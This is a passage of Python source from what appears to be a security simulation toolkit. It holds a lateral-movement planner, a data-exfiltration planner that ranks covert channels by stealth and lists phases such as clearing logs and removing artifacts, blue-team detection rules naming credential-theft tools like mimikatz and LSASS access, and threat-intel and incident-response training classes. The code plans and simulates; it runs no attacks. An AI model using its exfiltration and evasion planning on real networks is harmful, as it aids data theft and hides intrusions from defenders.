            })
            plan['required_tools'].update(best_path['recommended_tools'])
            plan['success_probability'] = best_path['score'] / 100
        else:
            # Try to find intermediate hosts
            for pivot_host in self.discovered_hosts:
                if pivot_host in [start_host, end_host]:
                    continue
                
                to_pivot = self.find_movement_paths(start_host, pivot_host)
                from_pivot = self.find_movement_paths(pivot_host, end_host)
                
                viable_to = [p for p in to_pivot if p['viable']]
                viable_from = [p for p in from_pivot if p['viable']]
                
                if viable_to and viable_from:
                    plan['hops'].append({
                        'from': start_host,
                        'to': pivot_host,
                        'technique': viable_to[0]['technique'],
                        'detection_risk': viable_to[0]['detection_risk']
                    })
                    plan['hops'].append({
                        'from': pivot_host,
                        'to': end_host,
                        'technique': viable_from[0]['technique'],
                        'detection_risk': viable_from[0]['detection_risk']
                    })
                    plan['required_tools'].update(viable_to[0]['recommended_tools'])
                    plan['required_tools'].update(viable_from[0]['recommended_tools'])
                    plan['success_probability'] = (viable_to[0]['score'] * viable_from[0]['score']) / 10000
                    break
        
        # Calculate total detection risk
        risks = [h['detection_risk'] for h in plan['hops']]
        if 'high' in risks:
            plan['total_detection_risk'] = 'high'
        elif 'medium' in risks:
            plan['total_detection_risk'] = 'medium'
        
        plan['required_tools'] = list(plan['required_tools'])
        plan['estimated_time'] = len(plan['hops']) * 15  # 15 min per hop
        
        return plan
    
    def generate_movement_report(self) -> str:
        """Generate lateral movement planning report."""
        lines = [
            "=" * 70,
            "üîÄ LATERAL MOVEMENT PLANNING REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üñ•Ô∏è Hosts Discovered: {len(self.discovered_hosts)}",
            f"üîë Credentials Available: {len(self.credentials)}",
            f"üìç Pivot Points: {len(self.pivot_points)}",
            ""
        ]
        
        # Credential summary
        if self.credentials:
            lines.extend([
                "üîë HARVESTED CREDENTIALS",
                "‚îÄ" * 40
            ])
            
            cred_types = {}
            for cred in self.credentials:
                ctype = cred['type']
                cred_types[ctype] = cred_types.get(ctype, 0) + 1
            
            for ctype, count in cred_types.items():
                lines.append(f"   {ctype.upper()}: {count}")
            lines.append("")
        
        # Network map
        if self.network_map:
            lines.extend([
                "üó∫Ô∏è NETWORK MAP",
                "‚îÄ" * 40
            ])
            
            for host_id, host in self.network_map.items():
                status = "üîì" if host['compromised'] else "üîí"
                lines.append(f"   {status} {host['hostname'] or host['ip']} ({host['os']})")
                lines.append(f"      Segment: {host['segment']} | Ports: {host['open_ports'][:5]}")
            lines.append("")
        
        # Available techniques
        lines.extend([
            "‚öîÔ∏è AVAILABLE TECHNIQUES",
            "‚îÄ" * 40
        ])
        
        for tech_id, tech in self.MOVEMENT_TECHNIQUES.items():
            risk_icon = {'low': 'üü¢', 'medium': 'üü°', 'high': 'üü†'}.get(tech['detection_risk'], '‚ö™')
            lines.append(f"   {risk_icon} {tech['name']} ({tech['mitre_id']})")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class DataExfiltrationPlanner:
    """Plan and simulate data exfiltration operations."""
    
    EXFIL_METHODS = {
        'http_post': {
            'name': 'HTTP POST',
            'protocol': 'http/https',
            'ports': [80, 443],
            'detection_risk': 'low',
            'bandwidth': 'high',
            'reliability': 'high',
            'encryption': 'optional',
            'description': 'Standard web traffic exfiltration'
        },
        'dns_tunnel': {
            'name': 'DNS Tunneling',
            'protocol': 'dns',
            'ports': [53],
            'detection_risk': 'medium',
            'bandwidth': 'low',
            'reliability': 'high',
            'encryption': 'encoded',
            'description': 'Covert channel via DNS queries'
        },
        'icmp_tunnel': {
            'name': 'ICMP Tunneling',
            'protocol': 'icmp',
            'ports': [],
            'detection_risk': 'medium',
            'bandwidth': 'low',
            'reliability': 'medium',
            'encryption': 'encoded',
            'description': 'Covert channel via ping packets'
        },
        'smtp': {
            'name': 'SMTP Exfiltration',
            'protocol': 'smtp',
            'ports': [25, 587, 465],
            'detection_risk': 'medium',
            'bandwidth': 'medium',
            'reliability': 'high',
            'encryption': 'optional',
            'description': 'Data via email attachments'
        },
        'ftp': {
            'name': 'FTP Upload',
            'protocol': 'ftp',
            'ports': [21, 20],
            'detection_risk': 'high',
            'bandwidth': 'high',
            'reliability': 'high',
            'encryption': 'no',
            'description': 'Traditional file transfer'
        },
        'cloud_storage': {
            'name': 'Cloud Storage',
            'protocol': 'https',
            'ports': [443],
            'detection_risk': 'low',
            'bandwidth': 'high',
            'reliability': 'high',
            'encryption': 'yes',
            'description': 'Exfil to S3, GCS, Azure Blob'
        },
        'steganography': {
            'name': 'Steganography',
            'protocol': 'http/https',
            'ports': [80, 443],
            'detection_risk': 'low',
            'bandwidth': 'very_low',
            'reliability': 'medium',
            'encryption': 'hidden',
            'description': 'Data hidden in images/media'
        },
        'websocket': {
            'name': 'WebSocket',
            'protocol': 'ws/wss',
            'ports': [80, 443],
            'detection_risk': 'low',
            'bandwidth': 'high',
            'reliability': 'high',
            'encryption': 'optional',
            'description': 'Real-time bidirectional channel'
        },
        'bluetooth': {
            'name': 'Bluetooth',
            'protocol': 'bluetooth',
            'ports': [],
            'detection_risk': 'low',
            'bandwidth': 'medium',
            'reliability': 'low',
            'encryption': 'yes',
            'description': 'Short-range wireless exfil'
        },
        'physical': {
            'name': 'Physical Media',
            'protocol': 'usb/sd',
            'ports': [],
            'detection_risk': 'variable',
            'bandwidth': 'very_high',
            'reliability': 'high',
            'encryption': 'optional',
            'description': 'USB drive, SD card extraction'
        }
    }
    
    DATA_CLASSIFICATIONS = {
        'public': {'value': 1, 'color': 'üü¢'},
        'internal': {'value': 2, 'color': 'üü°'},
        'confidential': {'value': 3, 'color': 'üü†'},
        'secret': {'value': 4, 'color': 'üî¥'},
        'top_secret': {'value': 5, 'color': '‚ö´'}
    }
    
    def __init__(self):
        self.target_data = []
        self.exfil_routes = []
        self.completed_exfils = []
        self.available_methods = list(self.EXFIL_METHODS.keys())
    
    def add_target_data(self, data_info: Dict[str, Any]) -> None:
        """Add data target for exfiltration."""
        self.target_data.append({
            'id': str(uuid.uuid4())[:8],
            'name': data_info.get('name', 'Unknown'),
            'path': data_info.get('path'),
            'size_bytes': data_info.get('size_bytes', 0),
            'classification': data_info.get('classification', 'internal'),
            'file_type': data_info.get('file_type', 'unknown'),
            'priority': data_info.get('priority', 'medium'),
            'compression_ratio': data_info.get('compression_ratio', 0.5),
            'discovered_time': datetime.now().isoformat()
        })
    
    def analyze_exfil_options(self, data_size_mb: float, 
                              time_constraint_hours: float = 24,
                              stealth_priority: str = 'high') -> List[Dict[str, Any]]:
        """Analyze and rank exfiltration options."""
        options = []
        
        for method_id, method in self.EXFIL_METHODS.items():
            if method_id not in self.available_methods:
                continue
            
            # Calculate transfer time
            bandwidth_rates = {
                'very_low': 0.01,  # MB/s
                'low': 0.1,
                'medium': 1.0,
                'high': 10.0,
                'very_high': 100.0
            }
            
            rate = bandwidth_rates.get(method['bandwidth'], 1.0)
            transfer_time_hours = (data_size_mb / rate) / 3600
            
            # Calculate stealth score
            risk_scores = {'low': 90, 'medium': 60, 'high': 30}
            stealth_score = risk_scores.get(method['detection_risk'], 50)
            
            # Time feasibility
            time_feasible = transfer_time_hours <= time_constraint_hours
            
            # Calculate overall score
            if stealth_priority == 'high':
                overall_score = stealth_score * 0.6 + (100 if time_feasible else 20) * 0.4
            elif stealth_priority == 'low':
                overall_score = stealth_score * 0.2 + (100 if time_feasible else 20) * 0.8
            else:
                overall_score = stealth_score * 0.4 + (100 if time_feasible else 20) * 0.6
            
            options.append({
                'method': method_id,
                'name': method['name'],
                'description': method['description'],
                'detection_risk': method['detection_risk'],
                'estimated_time_hours': round(transfer_time_hours, 2),
                'time_feasible': time_feasible,
                'stealth_score': stealth_score,
                'overall_score': round(overall_score, 1),
                'encryption': method['encryption'],
                'ports_required': method['ports']
            })
        
        options.sort(key=lambda x: -x['overall_score'])
        return options
    
    def create_exfil_plan(self, method: str, data_targets: List[str]) -> Dict[str, Any]:
        """Create detailed exfiltration plan."""
        method_info = self.EXFIL_METHODS.get(method)
        if not method_info:
            return {'error': 'Invalid method'}
        
        # Get target data info
        targets = [d for d in self.target_data if d['id'] in data_targets]
        total_size = sum(d['size_bytes'] for d in targets)
        
        plan = {
            'plan_id': str(uuid.uuid4())[:8],
            'method': method,
            'method_name': method_info['name'],
            'created': datetime.now().isoformat(),
            'status': 'planned',
            'targets': targets,
            'total_size_bytes': total_size,
            'total_size_mb': round(total_size / (1024 * 1024), 2),
            'phases': [],
            'opsec_considerations': []
        }
        
        # Phase 1: Staging
        plan['phases'].append({
            'phase': 1,
            'name': 'Data Staging',
            'actions': [
                'Identify staging location',
                'Copy target files to staging',
                'Apply compression if applicable',
                'Encrypt data with AES-256'
            ]
        })
        
        # Phase 2: Chunking
        plan['phases'].append({
            'phase': 2,
            'name': 'Data Preparation',
            'actions': [
                'Split data into transfer chunks',
                'Generate checksums for integrity',
                'Apply encoding if required',
                'Prepare transport headers'
            ]
        })
        
        # Phase 3: Transfer
        plan['phases'].append({
            'phase': 3,
            'name': 'Data Transfer',
            'actions': [
                f'Initiate {method_info["name"]} channel',
                'Transfer chunks with timing jitter',
                'Verify chunk receipts',
                'Handle retransmissions'
            ]
        })
        
        # Phase 4: Cleanup
        plan['phases'].append({
            'phase': 4,
            'name': 'Cleanup',
            'actions': [
                'Verify complete transfer',
                'Secure delete staging area',
                'Clear relevant logs',
                'Remove artifacts'
            ]
        })
        
        # OPSEC considerations
        plan['opsec_considerations'] = [
            'Use traffic shaping to blend with normal patterns',
            'Implement time-based transfer windows',
            'Use legitimate-looking domain names',
            'Rotate egress points if available',
            f'Monitor for {method_info["detection_risk"]} detection indicators'
        ]
        
        self.exfil_routes.append(plan)
        return plan
    
    def generate_exfil_report(self) -> str:
        """Generate data exfiltration planning report."""
        lines = [
            "=" * 70,
            "üì§ DATA EXFILTRATION PLANNING REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìÅ Target Data Items: {len(self.target_data)}",
            f"üõ£Ô∏è Planned Routes: {len(self.exfil_routes)}",
            f"‚úÖ Completed Exfils: {len(self.completed_exfils)}",
            ""
        ]
        
        # Target data summary
        if self.target_data:
            lines.extend([
                "üìÅ TARGET DATA INVENTORY",
                "‚îÄ" * 40
            ])
            
            total_size = 0
            for data in self.target_data:
                class_info = self.DATA_CLASSIFICATIONS.get(data['classification'], {})
                icon = class_info.get('color', '‚ö™')
                size_mb = data['size_bytes'] / (1024 * 1024)
                total_size += data['size_bytes']
                lines.append(f"   {icon} {data['name']} ({size_mb:.1f} MB) - {data['classification']}")
            
            lines.append(f"   üìä Total Size: {total_size / (1024*1024):.1f} MB")
            lines.append("")
        
        # Available methods
        lines.extend([
            "üì° EXFILTRATION METHODS",
            "‚îÄ" * 40
        ])
        
        for method_id, method in self.EXFIL_METHODS.items():
            risk_icon = {'low': 'üü¢', 'medium': 'üü°', 'high': 'üü†'}.get(method['detection_risk'], '‚ö™')
            bw_icon = {'very_low': 'üêå', 'low': 'üê¢', 'medium': 'üö∂', 'high': 'üöÄ', 'very_high': '‚ö°'}.get(method['bandwidth'], '‚û°Ô∏è')
            lines.append(f"   {risk_icon} {method['name']} {bw_icon}")
            lines.append(f"      {method['description']}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class BlueTeamSimulator:
    """Simulate blue team detection and response capabilities."""
    
    DETECTION_RULES = {
        'suspicious_process': {
            'name': 'Suspicious Process Creation',
            'description': 'Detects processes commonly used in attacks',
            'severity': 'medium',
            'data_sources': ['process_creation', 'command_line'],
            'indicators': ['powershell -enc', 'cmd /c', 'whoami', 'net user'],
            'false_positive_rate': 0.15
        },
        'lateral_movement': {
            'name': 'Lateral Movement Detection',
            'description': 'Detects lateral movement attempts',
            'severity': 'high',
            'data_sources': ['authentication', 'network_flow'],
            'indicators': ['pass_the_hash', 'psexec', 'wmi_exec'],
            'false_positive_rate': 0.10
        },
        'data_exfiltration': {
            'name': 'Data Exfiltration Detection',
            'description': 'Detects potential data theft',
            'severity': 'critical',
            'data_sources': ['network_flow', 'file_access'],
            'indicators': ['large_upload', 'dns_tunnel', 'encrypted_traffic'],
            'false_positive_rate': 0.20
        },
        'persistence': {
            'name': 'Persistence Mechanism',
            'description': 'Detects persistence establishment',
            'severity': 'high',
            'data_sources': ['registry', 'scheduled_tasks', 'services'],
            'indicators': ['run_key', 'scheduled_task', 'new_service'],
            'false_positive_rate': 0.25
        },
        'credential_access': {
            'name': 'Credential Access',
            'description': 'Detects credential theft attempts',
            'severity': 'critical',
            'data_sources': ['process_access', 'memory_access'],
            'indicators': ['lsass_access', 'sam_dump', 'mimikatz'],
            'false_positive_rate': 0.05
        }
    }
    
    RESPONSE_PLAYBOOKS = {
        'isolate_host': {
            'name': 'Host Isolation',
            'actions': ['Disable network adapter', 'Block at firewall', 'Alert SOC'],
            'time_minutes': 5,
            'automation_level': 'full'
        },
        'credential_reset': {
            'name': 'Credential Reset',
            'actions': ['Force password reset', 'Revoke tokens', 'Update service accounts'],
            'time_minutes': 30,
            'automation_level': 'partial'
        },
        'forensic_capture': {
            'name': 'Forensic Capture',
            'actions': ['Memory dump', 'Disk image', 'Log collection'],
            'time_minutes': 60,
            'automation_level': 'manual'
        }
    }
    
    def __init__(self):
        self.active_rules = list(self.DETECTION_RULES.keys())
        self.alerts = []
        self.blocked_actions = []
        self.detection_coverage = {}
    
    def simulate_detection(self, attack_action: Dict[str, Any]) -> Dict[str, Any]:
        """Simulate blue team detection of attack action."""
        action_type = attack_action.get('type', '')
        indicators = attack_action.get('indicators', [])
        
        detection_result = {
            'action': action_type,
            'detected': False,
            'triggered_rules': [],
            'alert_severity': 'none',
            'response_time_minutes': 0,
            'blocked': False
        }
        
        for rule_id in self.active_rules:
            rule = self.DETECTION_RULES[rule_id]
            
            # Check for indicator matches
            matches = set(indicators) & set(rule['indicators'])
            if matches:
                # Apply false positive rate
                if random.random() > rule['false_positive_rate']:
                    detection_result['detected'] = True
                    detection_result['triggered_rules'].append({
                        'rule_id': rule_id,
                        'name': rule['name'],
                        'severity': rule['severity'],
                        'matched_indicators': list(matches)
                    })
        
        if detection_result['detected']:
            # Determine highest severity
            severities = ['low', 'medium', 'high', 'critical']
            max_sev = 'low'
            for triggered in detection_result['triggered_rules']:
                if severities.index(triggered['severity']) > severities.index(max_sev):
                    max_sev = triggered['severity']
            
            detection_result['alert_severity'] = max_sev
            
            # Simulate response time
            response_times = {'low': 60, 'medium': 30, 'high': 15, 'critical': 5}
            detection_result['response_time_minutes'] = response_times.get(max_sev, 30)
            
            # Create alert
            alert = {
                'id': str(uuid.uuid4())[:8],
                'timestamp': datetime.now().isoformat(),
                'action': action_type,
                'severity': max_sev,
                'rules': detection_result['triggered_rules']
            }
            self.alerts.append(alert)
        
        return detection_result
    
    def calculate_detection_coverage(self, attack_chain: List[Dict]) -> Dict[str, Any]:
        """Calculate detection coverage for attack chain."""
        total_steps = len(attack_chain)
        detected_steps = 0
        missed_steps = []
        
        for step in attack_chain:
            result = self.simulate_detection(step)
            if result['detected']:
                detected_steps += 1
            else:
                missed_steps.append(step)
        
        coverage = (detected_steps / total_steps * 100) if total_steps > 0 else 0
        
        return {
            'total_steps': total_steps,
            'detected': detected_steps,
            'missed': len(missed_steps),
            'coverage_percentage': round(coverage, 1),
            'missed_steps': missed_steps,
            'recommendation': self._generate_coverage_recommendation(coverage)
        }
    
    def _generate_coverage_recommendation(self, coverage: float) -> str:
        """Generate recommendation based on coverage."""
        if coverage >= 90:
            return "Excellent detection coverage. Focus on reducing false positives."
        elif coverage >= 70:
            return "Good coverage but gaps exist. Review missed attack vectors."
        elif coverage >= 50:
            return "Moderate coverage. Significant detection gaps need addressing."
        else:
            return "Poor coverage. Major improvements needed in detection capabilities."
    
    def generate_defense_report(self) -> str:
        """Generate blue team defense report."""
        lines = [
            "=" * 70,
            "üõ°Ô∏è BLUE TEAM SIMULATION REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üìã Active Detection Rules: {len(self.active_rules)}",
            f"üö® Alerts Generated: {len(self.alerts)}",
            f"üö´ Actions Blocked: {len(self.blocked_actions)}",
            ""
        ]
        
        # Detection rules status
        lines.extend([
            "üìã DETECTION RULES",
            "‚îÄ" * 40
        ])
        
        for rule_id, rule in self.DETECTION_RULES.items():
            status = "‚úÖ" if rule_id in self.active_rules else "‚ùå"
            sev_icon = {'low': 'üü¢', 'medium': 'üü°', 'high': 'üü†', 'critical': 'üî¥'}.get(rule['severity'], '‚ö™')
            lines.append(f"   {status} {sev_icon} {rule['name']}")
        lines.append("")
        
        # Response playbooks
        lines.extend([
            "üìñ RESPONSE PLAYBOOKS",
            "‚îÄ" * 40
        ])
        
        for pb_id, playbook in self.RESPONSE_PLAYBOOKS.items():
            auto_icon = {'full': 'ü§ñ', 'partial': '‚öôÔ∏è', 'manual': 'üë§'}.get(playbook['automation_level'], '‚ùì')
            lines.append(f"   {auto_icon} {playbook['name']} ({playbook['time_minutes']} min)")
        
        # Recent alerts
        if self.alerts:
            lines.extend(["", "üö® RECENT ALERTS", "‚îÄ" * 40])
            for alert in self.alerts[-5:]:
                sev_icon = {'low': 'üü¢', 'medium': 'üü°', 'high': 'üü†', 'critical': 'üî¥'}.get(alert['severity'], '‚ö™')
                lines.append(f"   {sev_icon} [{alert['severity'].upper()}] {alert['action']}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class ThreatIntelCorrelator:
    """Correlate threat intelligence from multiple sources."""
    
    INTEL_SOURCES = {
        'alienvault_otx': {'name': 'AlienVault OTX', 'type': 'open', 'reliability': 0.75},
        'virustotal': {'name': 'VirusTotal', 'type': 'commercial', 'reliability': 0.90},
        'misp': {'name': 'MISP', 'type': 'community', 'reliability': 0.80},
        'abuse_ch': {'name': 'Abuse.ch', 'type': 'open', 'reliability': 0.85},
        'circl': {'name': 'CIRCL', 'type': 'academic', 'reliability': 0.80},
        'threatfox': {'name': 'ThreatFox', 'type': 'open', 'reliability': 0.82},
        'urlhaus': {'name': 'URLhaus', 'type': 'open', 'reliability': 0.83},
        'phishtank': {'name': 'PhishTank', 'type': 'community', 'reliability': 0.78}
    }
    
    IOC_TYPES = ['ip', 'domain', 'url', 'hash_md5', 'hash_sha1', 'hash_sha256', 'email', 'file_path']
    
    def __init__(self):
        self.iocs = {}
        self.correlations = []
        self.threat_actors = {}
        self.campaigns = {}
    
    def add_ioc(self, ioc_type: str, value: str, source: str, 
                metadata: Dict[str, Any] = None) -> str:
        """Add indicator of compromise."""
        ioc_id = hashlib.md5(f"{ioc_type}:{value}".encode()).hexdigest()[:12]
        
        if ioc_id not in self.iocs:
            self.iocs[ioc_id] = {
                'id': ioc_id,
                'type': ioc_type,
                'value': value,
                'sources': [],
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'threat_score': 0,
                'related_actors': [],
                'related_campaigns': [],
                'tags': [],
                'metadata': {}
            }
        
        # Add source if new
        source_info = self.INTEL_SOURCES.get(source, {'name': source, 'reliability': 0.5})
        if source not in [s['source'] for s in self.iocs[ioc_id]['sources']]:
            self.iocs[ioc_id]['sources'].append({
                'source': source,
                'name': source_info['name'],
                'reliability': source_info['reliability'],
                'added': datetime.now().isoformat()
            })
        
        # Update last seen
        self.iocs[ioc_id]['last_seen'] = datetime.now().isoformat()
        
        # Update metadata
        if metadata:
            self.iocs[ioc_id]['metadata'].update(metadata)
        
        # Recalculate threat score
        self._calculate_threat_score(ioc_id)
        
        return ioc_id
    
    def _calculate_threat_score(self, ioc_id: str) -> None:
        """Calculate threat score based on sources and metadata."""
        ioc = self.iocs.get(ioc_id)
        if not ioc:
            return
        
        # Base score from source reliability
        source_scores = [s['reliability'] * 100 for s in ioc['sources']]
        avg_source_score = sum(source_scores) / len(source_scores) if source_scores else 0
        
        # Multi-source bonus
        multi_source_bonus = min(len(ioc['sources']) * 5, 25)
        
        # Recency bonus
        last_seen = datetime.fromisoformat(ioc['last_seen'])
        age_days = (datetime.now() - last_seen).days
        recency_score = max(0, 25 - age_days)
        
        # Actor/campaign association bonus
        assoc_bonus = (len(ioc['related_actors']) + len(ioc['related_campaigns'])) * 10
        
        total_score = min(100, avg_source_score + multi_source_bonus + recency_score + assoc_bonus)
        ioc['threat_score'] = round(total_score, 1)
    
    def correlate_iocs(self) -> List[Dict[str, Any]]:
        """Find correlations between IOCs."""
        correlations = []
        
        ioc_list = list(self.iocs.values())
        
        for i, ioc1 in enumerate(ioc_list):
            for ioc2 in ioc_list[i+1:]:
                correlation = self._find_correlation(ioc1, ioc2)
                if correlation:
                    correlations.append(correlation)
        
        self.correlations = correlations
        return correlations
    
    def _find_correlation(self, ioc1: Dict, ioc2: Dict) -> Optional[Dict]:
        """Find correlation between two IOCs."""
        correlation_types = []
        strength = 0
        
        # Same source correlation
        shared_sources = set(s['source'] for s in ioc1['sources']) & set(s['source'] for s in ioc2['sources'])
        if shared_sources:
            correlation_types.append('shared_source')
            strength += len(shared_sources) * 10
        
        # Same actor correlation
        shared_actors = set(ioc1['related_actors']) & set(ioc2['related_actors'])
        if shared_actors:
            correlation_types.append('shared_actor')
            strength += len(shared_actors) * 30
        
        # Same campaign correlation
        shared_campaigns = set(ioc1['related_campaigns']) & set(ioc2['related_campaigns'])
        if shared_campaigns:
            correlation_types.append('shared_campaign')
            strength += len(shared_campaigns) * 25
        
        # Same tag correlation
        shared_tags = set(ioc1.get('tags', [])) & set(ioc2.get('tags', []))
        if shared_tags:
            correlation_types.append('shared_tag')
            strength += len(shared_tags) * 5
        
        if correlation_types:
            return {
                'ioc1_id': ioc1['id'],
                'ioc2_id': ioc2['id'],
                'types': correlation_types,
                'strength': min(100, strength),
                'shared_sources': list(shared_sources),
                'shared_actors': list(shared_actors),
                'shared_campaigns': list(shared_campaigns)
            }
        
        return None
    
    def add_threat_actor(self, actor_info: Dict[str, Any]) -> str:
        """Add threat actor profile."""
        actor_id = actor_info.get('id', str(uuid.uuid4())[:8])
        
        self.threat_actors[actor_id] = {
            'id': actor_id,
            'name': actor_info.get('name', 'Unknown'),
            'aliases': actor_info.get('aliases', []),
            'description': actor_info.get('description', ''),
            'motivation': actor_info.get('motivation', 'unknown'),
            'sophistication': actor_info.get('sophistication', 'intermediate'),
            'first_seen': actor_info.get('first_seen', datetime.now().isoformat()),
            'target_sectors': actor_info.get('target_sectors', []),
            'target_countries': actor_info.get('target_countries', []),
            'ttps': actor_info.get('ttps', []),
            'associated_iocs': []
        }
        
        return actor_id
    
    def link_ioc_to_actor(self, ioc_id: str, actor_id: str) -> bool:
        """Link IOC to threat actor."""
        if ioc_id in self.iocs and actor_id in self.threat_actors:
            if actor_id not in self.iocs[ioc_id]['related_actors']:
                self.iocs[ioc_id]['related_actors'].append(actor_id)
            if ioc_id not in self.threat_actors[actor_id]['associated_iocs']:
                self.threat_actors[actor_id]['associated_iocs'].append(ioc_id)
            self._calculate_threat_score(ioc_id)
            return True
        return False
    
    def generate_intel_report(self) -> str:
        """Generate threat intelligence correlation report."""
        lines = [
            "=" * 70,
            "üîç THREAT INTELLIGENCE CORRELATION REPORT",
            "=" * 70,
            "",
            f"üìÖ Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"üéØ Total IOCs: {len(self.iocs)}",
            f"üë§ Threat Actors: {len(self.threat_actors)}",
            f"üîó Correlations Found: {len(self.correlations)}",
            ""
        ]
        
        # High-threat IOCs
        high_threat = [ioc for ioc in self.iocs.values() if ioc['threat_score'] >= 70]
        if high_threat:
            lines.extend([
                "üö® HIGH-THREAT IOCS",
                "‚îÄ" * 40
            ])
            for ioc in sorted(high_threat, key=lambda x: -x['threat_score'])[:10]:
                lines.append(f"   üî¥ {ioc['type'].upper()}: {ioc['value'][:50]}...")
                lines.append(f"      Score: {ioc['threat_score']} | Sources: {len(ioc['sources'])}")
            lines.append("")
        
        # Threat actors
        if self.threat_actors:
            lines.extend([
                "üë§ THREAT ACTORS",
                "‚îÄ" * 40
            ])
            for actor_id, actor in self.threat_actors.items():
                soph_icon = {'novice': 'üü¢', 'intermediate': 'üü°', 'advanced': 'üü†', 'expert': 'üî¥'}.get(actor['sophistication'], '‚ö™')
                lines.append(f"   {soph_icon} {actor['name']} ({len(actor['associated_iocs'])} IOCs)")
            lines.append("")
        
        # Source summary
        lines.extend([
            "üì° INTELLIGENCE SOURCES",
            "‚îÄ" * 40
        ])
        
        source_counts = {}
        for ioc in self.iocs.values():
            for source in ioc['sources']:
                src = source['source']
                source_counts[src] = source_counts.get(src, 0) + 1
        
        for source_id, info in self.INTEL_SOURCES.items():
            count = source_counts.get(source_id, 0)
            rel_icon = "‚≠ê" * int(info['reliability'] * 5)
            lines.append(f"   {info['name']}: {count} IOCs {rel_icon}")
        
        lines.extend(["", "=" * 70])
        return "\n".join(lines)


class IncidentResponseTrainer:
    """Training scenarios for incident response teams."""
    
    SCENARIOS = {
        'ransomware_outbreak': {
            'name': 'Ransomware Outbreak',
            'difficulty': 'hard',
            'duration_hours': 4,
            'description': 'Active ransomware spreading through network',
            'objectives': [
                'Contain infected systems',
                'Identify patient zero',
                'Stop lateral movement',
                'Begin recovery process'
            ],
            'skills_tested': ['containment', 'forensics', 'communication']
        },
        'data_breach': {
            'name': 'Data Breach Response',
            'difficulty': 'medium',
            'duration_hours': 3,
            'description': 'Customer data exfiltration detected',
            'objectives': [
                'Identify scope of breach',
                'Stop active exfiltration',
                'Preserve evidence',
                'Prepare breach notification'
            ],
            'skills_tested': ['investigation', 'legal_compliance', 'communication']
        },
        'phishing_compromise': {
            'name': 'Phishing Campaign Response',
            'difficulty': 'easy',
            'duration_hours': 2,
            'description': 'Multiple users clicked phishing links',
            'objectives': [
                'Identify affected users',
                'Reset compromised credentials',
                'Block malicious domains',
                'User awareness communication'
            ],
            'skills_tested': ['triage', 'user_management', 'communication']
        },
        'insider_threat': {
            'name': 'Insider Threat Investigation',
            'difficulty': 'hard',
            'duration_hours': 5,
            'description': 'Suspected data theft by employee',
            'objectives': [
                'Preserve chain of custody',
                'Document suspicious activity',
                'Coordinate with HR/Legal',
                'Prevent evidence tampering'
            ],
            'skills_tested': ['investigation', 'legal_compliance', 'discretion']
        },
        'apt_intrusion': {
            'name': 'APT Intrusion Response',
            'difficulty': 'expert',
            'duration_hours': 8,
            'description': 'Advanced persistent threat detected',
            'objectives': [
                'Map adversary footprint',
                'Identify C2 infrastructure',
                'Develop eradication plan',
                'Implement hardening measures'
            ],
            'skills_tested': ['advanced_forensics', 'threat_hunting', 'strategy']
        }
    }
    
    def __init__(self):
        self.active_scenario = None
        self.team_actions = []
        self.scenario_timeline = []
        self.score = 0
        self.max_score = 100
    
    def start_scenario(self, scenario_id: str, team_info: Dict[str, Any] = None) -> Dict[str, Any]:
        """Start a training scenario."""
        scenario = self.SCENARIOS.get(scenario_id)
        if not scenario:
            return {'error': 'Invalid scenario'}
        
        self.active_scenario = {
            'id': scenario_id,
            'scenario': scenario,
            'start_time': datetime.now().isoformat(),
            'team': team_info or {'name': 'Default Team'},
            'status': 'active',
            'injects': self._generate_injects(scenario_id),
            'current_inject': 0,
            'actions_taken': [],
            'score': 0
        }
        
        return {
            'scenario_name': scenario['name'],
            'difficulty': scenario['difficulty'],
            'objectives': scenario['objectives'],
            'first_inject': self.active_scenario['injects'][0] if self.active_scenario['injects'] else None
        }
    
    def _generate_injects(self, scenario_id: str) -> List[Dict[str, Any]]:
        """Generate scenario injects (events/challenges)."""
        inject_templates = {
            'ransomware_outbreak': [
                {'time': 0, 'type': 'alert', 'message': 'EDR alert: Suspicious encryption activity on WSTN001'},
                {'time': 5, 'type': 'report', 'message': 'Help desk: Multiple users reporting inaccessible files'},
                {'time': 10, 'type': 'escalation', 'message': 'File shares becoming encrypted - ransomware confirmed'},
                {'time': 15, 'type': 'pressure', 'message': 'CEO asking for status update'},
                {'time': 20, 'type': 'discovery', 'message': 'Ransom note found demanding 10 BTC'}
            ],
            'data_breach': [
                {'time': 0, 'type': 'alert', 'message': 'DLP alert: Large data transfer to external IP'},
                {'time': 5, 'type': 'report', 'message': 'Firewall logs show 50GB outbound to unknown host'},
                {'time': 10, 'type': 'discovery', 'message': 'Customer PII identified in transferred files'},
                {'time': 15, 'type': 'legal', 'message': 'Legal counsel requesting breach scope assessment'}
            ],
            'phishing_compromise': [
                {'time': 0, 'type': 'alert', 'message': 'User reports suspicious email'},
                {'time': 5, 'type': 'discovery', 'message': '15 users clicked malicious link'},
                {'time': 10, 'type': 'escalation', 'message': 'Credential harvesting page identified'}
            ],
            'insider_threat': [
                {'time': 0, 'type': 'tip', 'message': 'Manager reports employee downloading sensitive files'},
                {'time': 5, 'type': 'alert', 'message': 'USB device connected to employee workstation'},
                {'time': 10, 'type': 'hr', 'message': 'HR confirms employee gave 2-week notice yesterday'}
            ],
            'apt_intrusion': [
                {'time': 0, 'type': 'intel', 'message': 'Threat intel: Your industry targeted by APT29'},
                {'time': 5, 'type': 'alert', 'message': 'Unusual DNS queries to dynamic DNS provider'},
                {'time': 10, 'type': 'discovery', 'message': 'PowerShell beacon identified on DC01'},
                {'time': 20, 'type': 'discovery', 'message': 'Cobalt Strike malleable C2 profile detected'},
                {'time': 30, 'type': 'escalation', 'message': 'Multiple domain admin accounts compromised'}
            ]
        }
        
        return inject_templates.get(scenario_id, [])
    
    def submit_action(self, action: Dict[str, Any]) -> Dict[str, Any]:
        """Submit team action and evaluate."""
        if not self.active_scenario:
            return {'error': 'No active scenario'}
        
        action_record = {
            'timestamp': datetime.now().isoformat(),
            'action_type': action.get('type'),
            'description': action.get('description'),
            'target': action.get('target')
        }
        
        # Evaluate action
